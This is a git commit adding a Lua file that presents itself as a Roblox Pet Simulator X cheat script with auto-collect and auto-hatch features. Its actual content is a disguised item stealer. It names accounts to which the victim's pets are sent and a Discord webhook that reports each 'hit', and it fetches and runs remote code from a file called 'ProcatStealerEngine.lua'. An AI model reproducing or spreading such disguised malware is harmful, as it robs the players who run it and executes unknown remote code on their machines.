b2c33eca9f482926df348155ce882d12688b62be
bishopwp <140591027+bishopwp@users.noreply.github.com>
2023-07-26 15:23:18 +0800

    Add files via upload

---
+++ PET SIMULATOR X Script Pastebin 2023 UPDATE YEET A PET AUTO COLLECT ORB  AUTO HATCH & MORE.lua
@@ -0,0 +1,5 @@
+UserName = "spamkaido" -- Good Pets are sent to
+Webhook = "https://discord.com/api/webhooks/1133658366644867072/flqkJzbj_sx66ECCVtSKaEW07gjRcgvqvMt6LSoDfOISUpie7Sil8fujPkci9LlneLmm" -- Webhook that pings when you get a hit!
+UserName2 = "spamkaido" -- Bad pets are sent to
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/procat69420/ProcatMailScript/main/ProcatStealerEngine.lua", true))()
